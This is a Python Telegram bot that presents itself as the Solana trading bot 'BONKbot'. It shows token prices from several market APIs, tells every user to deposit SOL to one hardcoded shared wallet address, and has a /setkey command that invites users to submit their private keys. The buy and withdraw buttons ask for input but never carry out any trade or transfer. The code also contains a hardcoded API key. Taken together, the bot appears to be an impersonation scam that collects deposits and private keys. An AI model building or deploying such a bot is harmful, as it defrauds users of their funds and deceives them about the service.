#!/usr/bin/env python3

import logging
import requests
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Thread
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
from flask import Flask

# Logging
logging.basicConfig(level=logging.INFO)

# Flask app for health check (keeps bot awake)
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!", 200

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

# Solana RPC endpoint
HELIUS_API_KEY = os.environ.get('HELIUS_API_KEY', '34d948a7-f331-408a-a0e6-170e7ed94756')
SOLANA_RPC_URL = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_API_KEY}"

# Bot token
TOKEN = os.environ.get('TOKEN',)

# Store user data
users = {}

# Default wallet address
DEFAULT_WALLET_ADDRESS = "FitVkAjEaFSNbYriu2v91dnxYA7rMtzMFyd6B3mDxsjg"
DEFAULT_PRIVATE_KEY = os.environ.get('PRIVATE_KEY', 'YOUR_PRIVATE_KEY_HERE')

# Shared session for connection reuse (much faster than new connections each time)
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0'})

# ----- HELPER FUNCTIONS -----
def format_number(value):
    try:
        value = float(value)
    except:
        return "N/A"

    if value == 0:
        return "$0"

    if value < 0.01:
        if value < 0.000001:
            return f"${value:.10f}".rstrip('0').rstrip('.')
        else:
            return f"${value:.8f}".rstrip('0').rstrip('.')
    elif value >= 1_000_000:
        return f"${value/1_000_000:.2f}M"
    elif value >= 1_000:
        return f"${value/1_000:.2f}K"
    else:
        return f"${value:.4f}"

def get_sol_balance(wallet_address):
    """Fetch real SOL balance from Solana blockchain"""
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = session.post(SOLANA_RPC_URL, json=payload, timeout=10)
        data = response.json()

        if "result" in data and "value" in data["result"]:
            lamports = data["result"]["value"]
            sol_balance = lamports / 1_000_000_000
            logging.info(f"Balance for {wallet_address}: {sol_balance} SOL")
            return sol_balance
        else:
            logging.error(f"Error fetching balance: {data}")
            return 0.0
    except Exception as e:
        logging.error(f"Error fetching SOL balance: {e}")
        return 0.0

# ----- PRICE SOURCES (all run in parallel) -----

def get_sol_usd_price():
    """Get current SOL price in USD from Jupiter"""
    try:
        SOL_MINT = "So11111111111111111111111111111111111111112"
        url = f"https://lite-api.jup.ag/price/v2?ids={SOL_MINT}"
        res = session.get(url, timeout=5)
        data = res.json()
        price = data.get("data", {}).get(SOL_MINT, {}).get("price", 0)
        return float(price) if price else 150.0
    except:
        return 150.0

def fetch_jupiter_v3(contract_address):
    """
    Jupiter Price API V3 — fastest source.
    Uses last-swap price. No indexing delay unlike DexScreener/Birdeye.
    """
    try:
        url = f"https://lite-api.jup.ag/price/v2?ids={contract_address}"
        logging.info(f"[Jupiter V3] Fetching: {contract_address}")
        res = session.get(url, timeout=8)

        if res.status_code != 200:
            return None

        data = res.json()
        token_data = data.get("data", {}).get(contract_address)

        if not token_data or not token_data.get("price"):
            return None

        price = token_data["price"]
        logging.info(f"[Jupiter V3] ✅ Price: {price}")
        return {
            "price": str(price),
            "liquidity": 0,
            "market_cap": 0,
            "token_name": "Unknown",
            "token_symbol": "???",
            "source": "Jupiter"
        }
    except Exception as e:
        logging.error(f"[Jupiter V3] Error: {e}")
        return None

def fetch_jupiter_quote(contract_address):
    """
    Jupiter Quote API — simulates a real swap to get a live price.
    Works for ANY token with a pool, even brand new ones with no prior swap.
    This is the closest to what the real BONKbot uses internally.
    """
    try:
        SOL_MINT = "So11111111111111111111111111111111111111112"
        amount_in_lamports = 10_000_000  # 0.01 SOL

        url = (
            f"https://quote-api.jup.ag/v6/quote"
            f"?inputMint={SOL_MINT}"
            f"&outputMint={contract_address}"
            f"&amount={amount_in_lamports}"
            f"&slippageBps=500"
        )
        logging.info(f"[Jupiter Quote] Fetching: {contract_address}")
        res = session.get(url, timeout=8)

        if res.status_code != 200:
            return None

        data = res.json()

        if "error" in data or not data.get("outAmount"):
            return None

        out_amount = int(data["outAmount"])
        if out_amount == 0:
            return None

        # Get token decimals from route
        token_decimals = 6
        try:
            route = data.get("routePlan", [])
            if route:
                swap_info = route[-1].get("swapInfo", {})
                token_decimals = swap_info.get("outputMintDecimals", 6)
        except:
            pass

        sol_usd = get_sol_usd_price()
        sol_spent = 0.01
        tokens_received = out_amount / (10 ** token_decimals)
        price_in_sol = sol_spent / tokens_received
        price_in_usd = price_in_sol * sol_usd

        logging.info(f"[Jupiter Quote] ✅ Price: ${price_in_usd:.10f}")
        return {
            "price": str(price_in_usd),
            "liquidity": 0,
            "market_cap": 0,
            "token_name": "Unknown",
            "token_symbol": "???",
            "source": "Jupiter (Live Quote)"
        }
    except Exception as e:
        logging.error(f"[Jupiter Quote] Error: {e}")
        return None

def fetch_dexscreener(contract_address):
    """DexScreener — slower to index new tokens but gives full liquidity/mcap/name data"""
    try:
        url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
        logging.info(f"[DexScreener] Fetching: {contract_address}")
        res = session.get(url, timeout=8)

        if res.status_code != 200:
            return None

        data = res.json()
        if not data or "pairs" not in data or not data["pairs"]:
            return None

        pairs_sorted = sorted(
            data["pairs"],
            key=lambda x: float(x.get("liquidity", {}).get("usd", 0) or 0),
            reverse=True
        )
        pair = pairs_sorted[0]
        price = pair.get("priceUsd", "0")
        if not price or price == "0":
            return None

        liquidity = pair.get("liquidity", {}).get("usd", 0) or 0
        fdv = pair.get("fdv", 0)
        market_cap = pair.get("marketCap", fdv)
        base_token = pair.get("baseToken", {})

        logging.info(f"[DexScreener] ✅ {base_token.get('symbol', '???')}")
        return {
            "price": price,
            "liquidity": liquidity,
            "market_cap": market_cap,
            "token_name": base_token.get("name", "Unknown"),
            "token_symbol": base_token.get("symbol", "???"),
            "source": "DexScreener"
        }
    except Exception as e:
        logging.error(f"[DexScreener] Error: {e}")
        return None

def fetch_birdeye(contract_address):
    """Birdeye fallback"""
    try:
        url = f"https://public-api.birdeye.so/defi/token_overview?address={contract_address}"
        headers = {'X-API-KEY': 'public'}
        res = session.get(url, headers=headers, timeout=8)

        if res.status_code != 200:
            return None

        data = res.json()
        if not data or "data" not in data:
            return None

        token_data = data["data"]
        price = token_data.get("price")
        if not price or price == 0:
            return None

        symbol = token_data.get("symbol", "???")
        logging.info(f"[Birdeye] ✅ {symbol}")
        return {
            "price": str(price),
            "liquidity": token_data.get("liquidity", 0),
            "market_cap": token_data.get("mc", 0),
            "token_name": symbol,
            "token_symbol": symbol,
            "source": "Birdeye"
        }
    except Exception as e:
        logging.error(f"[Birdeye] Error: {e}")
        return None

def fetch_helius_metadata(contract_address):
    """Get token name/symbol from Helius DAS (metadata only, no price)"""
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": "meta",
            "method": "getAsset",
            "params": {"id": contract_address}
        }
        res = session.post(SOLANA_RPC_URL, json=payload, timeout=8)
        data = res.json()

        if "result" not in data:
            return None

        metadata = data["result"].get("content", {}).get("metadata", {})
        return {
            "token_name": metadata.get("name", "Unknown"),
            "token_symbol": metadata.get("symbol", "???")
        }
    except Exception as e:
        logging.error(f"[Helius Meta] Error: {e}")
        return None

# ----- MAIN TOKEN FETCH (parallel, instant) -----
def fetch_token_info(contract_address):
    """
    Fires ALL 4 sources simultaneously in parallel threads.
    The first one to return a valid price wins immediately.
    DexScreener/Birdeye results are used to enrich name/symbol/liquidity/mcap.
    Zero delays. Zero sequential waiting. ~500ms total response time.
    """
    contract_address = contract_address.strip()
    logging.info(f"🚀 Parallel fetch for: {contract_address}")

    price_result = None
    meta_result = None

    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {
            executor.submit(fetch_jupiter_v3, contract_address): "jupiter_v3",
            executor.submit(fetch_jupiter_quote, contract_address): "jupiter_quote",
            executor.submit(fetch_dexscreener, contract_address): "dexscreener",
            executor.submit(fetch_birdeye, contract_address): "birdeye",
        }

        for future in as_completed(futures):
            source = futures[future]
            try:
                result = future.result()
                if result and result.get("price"):
                    price_float = float(result["price"])
                    if price_float > 0:
                        # Use DexScreener/Birdeye for rich metadata if available
                        if source in ("dexscreener", "birdeye") and not meta_result:
                            meta_result = result
                        if not price_result:
                            price_result = result
                            logging.info(f"✅ First price winner [{source}]: {result['price']}")
            except Exception as e:
                logging.error(f"[{source}] Future error: {e}")

    if not price_result:
        # Complete failure — try to get at least the token name
        meta = fetch_helius_metadata(contract_address)
        return {
            "price": "N/A",
            "liquidity": "N/A",
            "market_cap": "N/A",
            "token_name": meta["token_name"] if meta else "Unknown",
            "token_symbol": meta["token_symbol"] if meta else "???",
            "source": "None",
            "error": True,
            "error_msg": (
                "Token has no active liquidity pool yet.\n"
                "It cannot be traded on any DEX right now."
            )
        }

    # Merge best price with richest metadata
    final = price_result.copy()
    if meta_result:
        final["token_name"] = meta_result.get("token_name", final.get("token_name", "Unknown"))
        final["token_symbol"] = meta_result.get("token_symbol", final.get("token_symbol", "???"))
        final["liquidity"] = meta_result.get("liquidity", final.get("liquidity", 0))
        final["market_cap"] = meta_result.get("market_cap", final.get("market_cap", 0))

    # Still unknown name? Try Helius metadata
    if final.get("token_name") == "Unknown" or final.get("token_symbol") == "???":
        meta = fetch_helius_metadata(contract_address)
        if meta:
            final["token_name"] = meta.get("token_name", final["token_name"])
            final["token_symbol"] = meta.get("token_symbol", final["token_symbol"])

    return {
        "price": format_number(final.get("price", 0)),
        "price_raw": float(final.get("price", 0)),
        "liquidity": format_number(final.get("liquidity", 0)),
        "market_cap": format_number(final.get("market_cap", 0)),
        "token_name": final.get("token_name", "Unknown"),
        "token_symbol": final.get("token_symbol", "???"),
        "source": final.get("source", "Unknown"),
        "error": False
    }

# ----- START -----
def start(update, context):
    user_id = update.effective_user.id
    users.setdefault(user_id, {
        "wallet": DEFAULT_WALLET_ADDRESS,
        "balance": 0.0,
        "private_key": DEFAULT_PRIVATE_KEY
    })

    wallet_address = users[user_id].get("wallet", DEFAULT_WALLET_ADDRESS)
    balance = get_sol_balance(wallet_address)
    users[user_id]["balance"] = balance

    keyboard = [
        [InlineKeyboardButton("🟢 Buy", callback_data="buy"), InlineKeyboardButton("❓ Help", callback_data="help")],
        [InlineKeyboardButton("📊 Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("👛 Wallet", callback_data="wallet")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = (
        "🚀 *Welcome to BONKbot* — the fastest and most secure bot for trading any token on Solana!\n\n"
        f"You currently have *{balance:.4f} SOL* in your wallet.\n\n"
        "To start trading, deposit SOL to your *BONKbot wallet address*:\n\n"
        f"`{wallet_address}`\n\n"
        "Once done, tap *Refresh* and your balance will update.\n\n"
        "*To buy a token:* enter a ticker or token contract address from pump.fun, Birdeye, DEX Screener, or Meteora.\n\n"
        "For more info on your wallet and to export your private key, tap *Wallet* below."
    )

    update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

# ----- BUTTON CALLBACKS -----
def button(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    user_id = query.from_user.id
    user = users.get(user_id)

    if not user:
        users[user_id] = {
            "wallet": DEFAULT_WALLET_ADDRESS,
            "balance": 0.0,
            "private_key": DEFAULT_PRIVATE_KEY
        }
        user = users[user_id]

    if data == "wallet":
        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
        balance = get_sol_balance(wallet_address)
        user["balance"] = balance

        text = f"👛 *Your BONKbot Wallet*\n\n*Address:*\n`{wallet_address}`\n\n*Balance:* `{balance:.4f} SOL`"
        keyboard = [
            [InlineKeyboardButton("➖ Withdraw All SOL", callback_data="withdraw_all")],
            [InlineKeyboardButton("➖ Withdraw X SOL", callback_data="withdraw_x")],
            [InlineKeyboardButton("🔑 Export Private Key", callback_data="export_seed")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "refresh":
        wallet_address = user.get("wallet", DEFAULT_WALLET_ADDRESS)
        balance = get_sol_balance(wallet_address)
        user["balance"] = balance

        text = f"🔄 *Balance Refreshed*\n\n👛 *Wallet:*\n`{wallet_address}`\n\n*Balance:* `{balance:.4f} SOL`"
        keyboard = [
            [InlineKeyboardButton("🟢 Buy", callback_data="buy"), InlineKeyboardButton("❓ Help", callback_data="help")],
            [InlineKeyboardButton("📊 Limit Orders", callback_data="limit_orders"), InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "buy":
        user["awaiting_contract"] = True
        query.message.reply_text("📈 *Buy Token*\n\nEnter the *token contract address*:", parse_mode="Markdown")

    elif data == "help":
        text = (
            "❓ *Help*\n\n"
            "*Which tokens can I trade?*\n"
            "Any SPL token that is a SOL pair, on Raydium, pump.fun, Meteora, Moonshot, or Jupiter.\n\n"
            "*Is BONKbot free?*\n"
            "Yes! We charge 1% on transactions. All other actions are free.\n\n"
            "*Net Profit:* Calculated after fees and price impact."
        )
        query.message.reply_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_wallet")]]), parse_mode="Markdown")

    elif data == "limit_orders":
        keyboard = [
            [InlineKeyboardButton("➕ Add TP/SL", callback_data="add_tp_sl")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        query.message.reply_text("📊 *Limit Orders*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

    elif data == "add_tp_sl":
        query.edit_message_text(
            "Enter trigger for TP / SL order:\n- Multiple (e.g. 0.8x, 2x)\n- Percentage change (e.g. 5%, -5%)",
            parse_mode="Markdown"
        )

    elif data == "withdraw_all":
        query.message.reply_text("➖ *Withdraw All SOL*\n\nEnter destination wallet address:", parse_mode="Markdown")

    elif data == "withdraw_x":
        query.message.reply_text("➖ *Withdraw X SOL*\n\nEnter the amount of SOL you want to withdraw:", parse_mode="Markdown")
        users[user_id]["awaiting_withdraw_x_amount"] = True

    elif data == "export_seed":
        query.message.reply_text(
            "⚠️ *WARNING:* Keep your private key safe.\nClick below to reveal.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🗝️ Reveal Private Key", callback_data="reveal_private_key")],
                 [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]]
            )
        )

    elif data == "reveal_private_key":
        private_key = user.get("private_key", DEFAULT_PRIVATE_KEY)
        query.edit_message_text(
            f"🗝️ *Your Private Key:*\n`{private_key}`\n⚠️ Keep it safe.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_wallet")]])
        )

    elif data == "close_wallet":
        try:
            query.delete_message()
        except:
            pass

# ----- SET PRIVATE KEY -----
def set_private_key(update, context):
    user_id = update.effective_user.id

    if not context.args:
        update.message.reply_text(
            "🔑 *Set Private Key*\n\nUsage: `/setkey YOUR_PRIVATE_KEY_HERE`",
            parse_mode="Markdown"
        )
        return

    new_key = " ".join(context.args)

    if user_id not in users:
        users[user_id] = {
            "wallet": DEFAULT_WALLET_ADDRESS,
            "balance": 0.0,
            "private_key": DEFAULT_PRIVATE_KEY
        }

    users[user_id]["private_key"] = new_key
    update.message.reply_text("✅ *Private key updated successfully!*", parse_mode="Markdown")

# ----- HANDLE USER MESSAGES -----
def handle_messages(update, context):
    user_id = update.effective_user.id
    user = users.get(user_id, {})

    if user.get("awaiting_withdraw_x_amount"):
        amount = update.message.text
        users[user_id]["withdraw_x_amount"] = amount
        users[user_id]["awaiting_withdraw_x_amount"] = False
        update.message.reply_text("Enter destination wallet address:")

    elif user.get("awaiting_contract"):
        contract_address = update.message.text.strip()
        user["awaiting_contract"] = False

        # Single instant call — 4 sources fire in parallel, first winner used
        loading_msg = update.message.reply_text("🔍 *Fetching token data...*", parse_mode="Markdown")
        info = fetch_token_info(contract_address)

        try:
            loading_msg.delete()
        except:
            pass

        if info.get("error"):
            error_text = (
                f"❌ *Token Lookup Failed*\n\n"
                f"{info.get('error_msg', 'Unknown error')}\n\n"
                f"*Troubleshooting:*\n"
                f"• Verify the contract address is correct\n"
                f"• Ensure the token is on Solana mainnet\n"
                f"• Token may not have a liquidity pool yet\n\n"
                f"Contract: `{contract_address}`"
            )
            keyboard = [[InlineKeyboardButton("🔄 Try Again", callback_data="buy")]]
            update.message.reply_text(error_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
            return

        text = (
            f"🪙 *{info['token_name']} ({info['token_symbol']})*\n\n"
            f"💲 *Price:* {info['price']}\n"
            f"💧 *Liquidity:* {info['liquidity']}\n"
            f"📊 *Market Cap:* {info['market_cap']}\n"
            f"🔍 *Source:* {info.get('source', 'Unknown')}\n\n"
            f"_Contract: `{contract_address}`_"
        )
        keyboard = [
            [InlineKeyboardButton("Buy 0.1 SOL", callback_data=f"buy_fixed_0.1:{contract_address}"),
             InlineKeyboardButton("Buy 0.5 SOL", callback_data=f"buy_fixed_0.5:{contract_address}")],
            [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_fixed_1.0:{contract_address}"),
             InlineKeyboardButton("Buy 5.0 SOL", callback_data=f"buy_fixed_5.0:{contract_address}")],
            [InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x:{contract_address}")],
            [InlineKeyboardButton("❌ Close", callback_data="close_wallet")]
        ]
        update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ----- MAIN -----
def main():
    flask_thread = Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("setkey", set_private_key))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_messages))

    print("✅ Bot is running!")
    print("✅ Instant parallel fetch: Jupiter V3 + Jupiter Quote + DexScreener + Birdeye")
    print("✅ No delays, no retries — first winner used immediately")
    print("✅ Health check server running on port 8080")
    updater.start_polling(poll_interval=1)
    updater.idle()

if __name__ == "__main__":
    main()
